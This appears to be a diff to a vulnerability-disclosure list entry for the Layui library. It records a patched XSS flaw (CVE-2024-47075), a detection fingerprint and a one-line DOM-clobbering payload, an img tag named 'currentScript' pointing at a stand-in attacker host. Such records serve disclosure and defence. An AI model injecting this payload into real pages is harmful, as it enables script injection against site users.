@@ -6,9 +6,9 @@
 + Stars: 29.5K
 + Version: v2.9.16
 + Fingerprint: `window.LAYUI_GLOBAL  !== undefined`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx">```
++ Payload: ```<img name="currentScript" src="https://attack.hulk">```
 + Impact: XSS
-+ CVE: CVE-2024-47075
++ CVE: [CVE-2024-47075](https://github.com/layui/layui/security/advisories/GHSA-j827-6rgf-9629)
 + Status: Patched
 + Security Policy: Requested
 + Foundby: TheHulk
